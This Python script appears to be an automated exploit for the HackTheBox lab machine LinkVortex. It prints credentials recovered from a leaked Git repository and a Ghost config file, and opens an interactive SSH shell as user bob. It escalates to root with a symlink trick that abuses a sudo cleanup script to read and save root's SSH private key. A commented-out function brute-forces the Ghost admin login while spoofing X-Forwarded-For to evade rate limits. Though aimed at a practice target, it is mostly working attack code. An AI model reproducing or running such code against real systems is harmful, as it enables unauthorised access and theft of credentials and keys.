import sys, os
import time as cm
import requests
import subprocess
import paramiko
from threading import Thread
import time as cm
from colorama import Fore, init
from consolemenu import SelectionMenu

init(autoreset=True)

def banner():
    os.system("clear")
    bnn = """
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⣧⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣶⡀⠀⠀⢀⡴⠛⠁⠀⠘⣿⡄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⣤⡴⠋⠀⠀⠀⠀⠀⢿⣇⠀         ▓█████ ▄████▄   ██░ ██  ██ ▄█▀                       █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⣿⠀         ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⣿⡀         ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢏⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⡇         ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣷⣾⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢿⡇         ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄                       █
                  ⠀⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢸⡇         ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒                       █
                  ⠀⠀⠀⠀⠀⠀⢠⡞⠁⢹⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⠀          ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░                       █
                  ⠀⠀⠀⠀⠀⣠⠟⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⠀          ░  ░         ░  ░░ ░░ ░░ ░                          █
                  ⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⣴⠋⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀          ___ ___ ___ ___                                     █
                  ⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀         (___|___|___|___)                                    █
                  ⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀         G1thub: https://github.com/l44x                      █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀         T4skT00l: Pw3ned-R00t [ LinkVortex ]                 █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀    ___ ___ ___ ___                                           █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀   (___|___|___|___)                                          █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠃                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    """
    print(Fore.GREEN + f"{bnn}")

# def resolve_form():
    
#     website="http://linkvortex.htb/ghost/api/admin/session"
    
#     s = requests.Session()
    
#     with open('passwords.txt', "r", encoding='utf-8') as f:
#         print(Fore.GREEN+f"\n-------------- Successlly Connection------------------")
#         for index, line in enumerate(f):
#             # print(index, line)

#             header = {
#                 'Host': 'linkvortex.htb',
#                 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
#                 'Referer': 'http://linkvortex.htb/ghost/',
#                 'Content-Type': 'application/json;charset=utf-8',
#                 'X-Ghost-Version': '5.58',
#                 'X-Forwarded-For': f'nevermind{index}',
#             }
            
#             credentials = {
#                 'username': 'admin@linkvortex.htb',
#                 'password': f'{line.strip()}'
#             }
            
#             r = s.post(website, json=credentials, headers=header)
#             if r.status_code != 422:
#                 print(Fore.GREEN,r.json())
#             else:
#                 print(Fore.RED,"\t\t |\t[+] Failed Connection Credentials. :2 ")
#                 print(Fore.RED,r.json())
#                 pass
                
#         print(Fore.GREEN+"---------------------------------------------------------")

global machine_ip
global target_machine

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.47"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t\t~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print("----------------------------------------------------")
        print(Fore.CYAN + f"\t\t ~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t [HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(Fore.RED + f"\t\t\t\t\t[Target Path Exploit] > " + Fore.YELLOW + f"http://dev.linkvortex.htb/.git")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Broker Network")
        print("----------------------------------------------------\n")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")


# CVE escalate privilegies: CVE-2023-40028

def unlocked():
    try:
        checker_status()
        user_default_hackthebox()
        
        # Menu seleccionar usuario a conectarse. www-data, jimmy, joanna, root
        while True:
            users=["admin", "bob", "root", "exit"]
            client = paramiko.SSHClient()
            host = target_machine
            username = "bob"
            password = "fibber-talented-worth"
            print("----------------------------------------------------")
            print(Fore.MAGENTA + f"\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t     ~ What ur user select? > "))
            print("----------------------------------------------------\n")

            if user_call == 1:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\n\t\t ~ [Connection to admin :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Path] > " + Fore.GREEN + f"http://linkvortex.htb/ghost")
                    print(Fore.RED + f"\t\t\t\t\t[Target Repository] > " + Fore.YELLOW + f"GitHack.py: https://github.com/arthaud/git-dumper")
                    print(Fore.RED + f"\t\t\t\t\t[Target Path Exploit] > " + Fore.YELLOW + f"dump_git/ghost/core/test/regression/api/admin/authentication.test.js")
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.GREEN + f"Username: {users[0]}@linkvortex.htb, Password: OctopiFociPilfer45")
                    cm.sleep(.5)
                    print("----------------------------------------------------\n")
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
                    

            if user_call == 2:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to bob :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Path] > " + Fore.GREEN + f"/var/lib/ghost/config.production.json")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.GREEN + f"Username: {username}, Password: {password}")
                    cm.sleep(.5)
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                    #init shell
                    shell = client.invoke_shell()
                    shell.settimeout(1)
                    while True:
                        if shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                            
                        command = input("$ ")
                        if command.lower() in ["exit", "quit"]:
                            print("\n[!] Closing connection...")
                            break
                        
                        shell.send(command + "\n")
                        cm.sleep(0.5)

                        while shell.recv_ready():
                            output = shell.recv(15000).decode('latin-1')  # Usa otro códec que maneje los bytes
                            print(output, end="")

                    shell.close()
                    client.close()
                    print("----------------------------------------------------\n")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break

            elif user_call == 3:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to root :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Sudo Path] > " + Fore.GREEN + f"/usr/bin/bash /opt/ghost/clean_symlink.sh *.png")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.GREEN + f"Username: {username}, Password: {password}")
                    cm.sleep(.5)
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                    #init shell
                    cm.sleep(3)
                    shell = client.invoke_shell()
                    shell.settimeout(1)
                    shell.send("ln -s /root/.ssh/id_rsa ./moment.txt" + "\n")
                    cm.sleep(2)
                    shell.send("ln -s /home/bob/moment.txt ./moment.png" + "\n")
                    cm.sleep(2)
                    shell.send("sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/moment.png" + "\n")
                    cm.sleep(1)
                    output_shell = shell.recv(15000).decode('utf-8')
                    #print(output_shell)
                    client.close()
                    #print(Fore.RED + f"\t\t\t\t\t[Exploit - Message] > " + Fore.GREEN + f"Create a new file id_rsa for connect root.")
                    commands_send(f"echo \'{output_shell}\' > id_rsa_beta")
                    commands_send("cat id_rsa_beta | grep 'BEGIN OPENSSH PRIVATE KEY' -A 37 > id_rsa")
                    commands_send("rm id_rsa_beta")
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Message] > " + Fore.GREEN + f"id_rsa file successlly. Check file :3")
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Message] > " + Fore.GREEN + f"Create a new file id_rsa for connect root.")
                    print("----------------------------------------------------\n")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
            
            elif user_call == 4:
                    break
            else:
                break
            
            
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [root-user] {e}")

if __name__ == '__main__':
    banner()
    unlocked()
    
    #t1 = Thread(target=resolve_form)
    #t1.run()
    
